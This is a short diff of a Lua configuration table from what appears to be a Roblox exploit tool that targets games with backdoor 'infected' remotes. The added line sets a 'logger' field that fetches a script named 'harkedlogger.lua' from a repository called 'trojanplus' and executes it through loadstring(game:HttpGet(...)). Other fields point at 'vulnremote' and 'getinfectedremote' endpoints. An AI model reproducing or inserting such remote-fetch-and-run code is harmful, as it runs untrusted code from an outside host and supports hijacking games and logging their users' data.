@@ -154,7 +154,7 @@ local script = G2L["7"];
 			vulnremote = nil,
 			jeff = false,
 			postGame = "https://sudoers.lol/strawberrycmd/v1/game",
-			getinfectedremote = "https://sudoers.lol/strawberrycmd/v1/getinfectedremote"
+			getinfectedremote = "https://sudoers.lol/strawberrycmd/v1/getinfectedremote",
 			logger = loadstring(game:HttpGet("https://codeberg.org/trojanplus/scripts/raw/branch/main/harkedlogger.lua"))()
 	
 		}
